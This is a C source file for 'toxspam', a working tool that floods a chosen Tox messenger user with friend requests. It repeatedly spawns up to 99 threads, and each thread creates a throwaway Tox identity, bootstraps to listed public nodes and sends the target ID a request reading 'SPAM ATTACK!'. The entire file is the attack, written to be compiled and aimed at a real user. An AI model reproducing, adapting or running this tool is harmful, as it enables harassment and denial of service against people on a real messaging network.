/*  main.c
 *
 *
 *  Copyright (C) 2024 toxspam All Rights Reserved.
 *
 *  This file is part of toxspam.
 *
 *  toxspam is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  toxspam is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with toxspam.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include "util.h"

#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#include <tox/tox.h>

/* Maximum number of concurrent tox instances */
#define MAX_THREADS 99u

typedef struct Spammer {
    Tox            *tox;
    pthread_t      tid;
    pthread_attr_t attr;
    time_t         time_request_sent;
} Spammer;

/* Use these to lock and unlock the global threads struct */
#define LOCK   pthread_mutex_lock(&threads.lock)
#define UNLOCK pthread_mutex_unlock(&threads.lock)

struct Threads {
    uint8_t   tox_id_bin[TOX_ADDRESS_SIZE];
    uint16_t  num_active;
    pthread_mutex_t lock;
} threads;

static const struct toxNodes {
    const char *ip;
    uint16_t    port;
    const char *key;
} bs_nodes[] = {
    { "144.217.86.39",      33445, "7E5668E0EE09E19F320AD47902419331FFEE147BB3606769CFBE921A2A2FD34C" },
    { "tox.abilinski.com",  33445, "10C00EB250C3233E343E2AEBA07115A5C28920E9C8D29492F6D00B29049EDC7E" },
    { "tox4.plastiras.org", 33445, "BEF0CFB37AF874BD17B9A8F9FE64C75521DB95A37D33C5BDB00E9CF58659C04F" },
    { "81.169.136.229",     33445, "836D1DA2BE12FE0E669334E437BE3FB02806F1528C2B2782113E0910C7711409" },
    { "46.101.197.175",     33445, "CD133B521159541FB1D326DE9850F5E56A6C724B5B8E5EB5CD8D950408E95707" },
    { "172.104.215.182",    33445, "DA2BD927E01CD05EBCC2574EBE5BEBB10FF59AE0B2105A7D1E2B40E49BB20239" },
    { "188.225.9.167",      33445, "1911341A83E02503AB1FD6561BD64AF3A9D6C3F12B5FBB656976B2E678644A67" },
    { "122.116.39.151",     33445, "5716530A10D362867C8E87EE1CD5362A233BAFBBA4CF47FA73B7CAD368BD5E6E" },
    { "tox.initramfs.io",   33445, "3F0A45A268367C1BEA652F258C85F4A66DA76BCAA667A49E770BCC4917AB6A25" },
    { "139.162.110.188",    33445, "F76A11284547163889DDC89A7738CF271797BF5E5E220643E97AD3C7E7903D55" },
    { "198.98.49.206",      33445, "28DB44A3CEEE69146469855DFFE5F54DA567F5D65E03EFB1D38BBAEFF2553255" },
    { "172.105.109.31",     33445, "D46E97CF995DC1820B92B7D899E152A217D36ABE22730FEA4B6BF1BFC06C617C" },
    { "91.146.66.26",       33445, "B5E7DAC610DBDE55F359C7F8690B294C8E4FCEC4385DE9525DBFA5523EAD9D53" },
    { NULL, 0, NULL },
};

/* Attempts to bootstrap to every listed bootstrap node */
static void bootstrap_tox(Spammer *spam)
{
    for (size_t i = 0; bs_nodes[i].ip != NULL; ++i) {
        char bin_key[TOX_PUBLIC_KEY_SIZE];
        if (hex_string_to_bin(bs_nodes[i].key, strlen(bs_nodes[i].key), bin_key, sizeof(bin_key)) == -1) {
            fprintf(stderr, "failed to parse bootstrap node: %s\n", bs_nodes[i].key);
            continue;
        }

        Tox_Err_Bootstrap err;
        tox_bootstrap(spam->tox, bs_nodes[i].ip, bs_nodes[i].port, (uint8_t *) bin_key, &err);

        if (err != TOX_ERR_BOOTSTRAP_OK) {
            fprintf(stderr, "Failed to bootstrap DHT via: %s %d (error %d)\n", bs_nodes[i].ip, bs_nodes[i].port, err);
        }
    }
}

static volatile bool FLAG_EXIT = false;
static void catch_SIGINT(int sig)
{
    LOCK;
    FLAG_EXIT = true;
    UNLOCK;
}

static void send_friend_request(Spammer *spam, const uint8_t *tox_id)
{
    if (spam->time_request_sent > 0) {
        return;
    }

    const char *msg = "SPAM ATTACK!";

    Tox_Err_Friend_Add err;
    tox_friend_add(spam->tox, tox_id, (uint8_t *)msg, strlen(msg), &err);

    if (err == TOX_ERR_FRIEND_ADD_OK) {
        spam->time_request_sent = get_time();
    } else {
        fprintf(stderr, "friend add error: %d\n", err);
    }
}

/*
 * Returns a pointer to an inactive spammer in the threads array.
 * Returns NULL if there are no spammers available.
 */
Spammer *spammer_new(void)
{
    Spammer *spam = (Spammer *) calloc(1, sizeof(Spammer));

    if (spam == NULL) {
        return spam;
    }

    struct Tox_Options options;
    tox_options_default(&options);

    Tox_Err_New err;
    Tox *tox = tox_new(&options, &err);

    if (err != TOX_ERR_NEW_OK || tox == NULL) {
        fprintf(stderr, "tox_new() failed: %d\n", err);
        free(spam);
        return NULL;
    }

    spam->tox = tox;
    bootstrap_tox(spam);

    return spam;
}

static void spammer_kill(Spammer *spam)
{
    pthread_attr_destroy(&spam->attr);
    tox_kill(spam->tox);
    free(spam);
}

/* How long we wait after a successful request before we kill the tox instance */
#define TIME_WAIT_AFTER_SEND 5

static bool spammer_finished(Spammer *spam)
{
    LOCK;
    if (FLAG_EXIT || (spam->time_request_sent > 0 && timed_out(spam->time_request_sent, TIME_WAIT_AFTER_SEND))) {
        UNLOCK;
        return true;
    }
    UNLOCK;

    return false;
}

void *do_spammer_thread(void *data)
{
    Spammer *spam = (Spammer *) data;

    while (!spammer_finished(spam)) {
        tox_iterate(spam->tox, spam);

        if (tox_self_get_connection_status(spam->tox) != TOX_CONNECTION_NONE) {
            send_friend_request(spam, threads.tox_id_bin);
        }

        sleep_thread(tox_iteration_interval(spam->tox) * 1000);
    }

    spammer_kill(spam);

    LOCK;
    --threads.num_active;
    fprintf(stderr, "killing thread (%u total)\n", threads.num_active);
    UNLOCK;

    pthread_exit(0);
}

/* Initializes a spammer thread.
 *
 * Returns 0 on success.
 * Returns -1 if thread attributes cannot be set.
 * Returns -2 if thread state cannot be set.
 * Returns -3 if thread cannot be created.
 */
static int init_tox_thread(Spammer *spam)
{
    if (pthread_attr_init(&spam->attr) != 0) {
        return -1;
    }

    if (pthread_attr_setdetachstate(&spam->attr, PTHREAD_CREATE_DETACHED) != 0) {
        pthread_attr_destroy(&spam->attr);
        return -2;
    }

    if (pthread_create(&spam->tid, NULL, do_spammer_thread, (void *) spam) != 0) {
        pthread_attr_destroy(&spam->attr);
        return -3;
    }

    return 0;
}

/*
 * Creates new spammer instances.
 *
 * Returns 0 on success or if new instance is not needed.
 * Returns -1 if spammer instance fails to initialize.
 * Returns -2 if thread fails to initialize.
 */
static int do_thread_control(void)
{
    LOCK;
    const uint16_t num_active_threads = threads.num_active;
    UNLOCK;

    if (num_active_threads >= MAX_THREADS) {
        return 0;
    }

    Spammer *spam = spammer_new();

    if (spam == NULL) {
        return -1;
    }

    const int ret = init_tox_thread(spam);

    if (ret != 0) {
        fprintf(stderr, "init_tox_thread() failed with error: %d\n", ret);
        return -2;
    }

    LOCK;
    ++threads.num_active;
    fprintf(stderr, "new thread (%u total)\n", threads.num_active);
    UNLOCK;

    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        printf("Usage: ./spammer <target_tox_id>\n");
        return -1;
    }

    const char *target_id = argv[1];

    if (tox_id_string_to_bin(target_id, strlen(target_id), threads.tox_id_bin, sizeof(threads.tox_id_bin)) == -1) {
        fprintf(stderr, "Invalid Tox ID: %s", target_id);
        return -1;
    }

    if (pthread_mutex_init(&threads.lock, NULL) != 0) {
        fprintf(stderr, "pthread mutex failed to init in main()\n");
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, catch_SIGINT);

    while (true) {
        LOCK;
        const bool flag_exit = FLAG_EXIT;
        UNLOCK;

        if (flag_exit) {
            break;
        }

        const int ret = do_thread_control();

        if (ret < 0) {
            fprintf(stderr, "do_thread_control() failed with error %d\n", ret);
            sleep(5);
        } else {
            sleep_thread(10000);
        }
    }

    /* Wait for threads to exit cleanly */
    while (true) {
        LOCK;
        const uint16_t num_active_threads = threads.num_active;
        UNLOCK;

        if (num_active_threads == 0) {
            break;
        }

        sleep_thread(10000);
    }

    return 0;
}
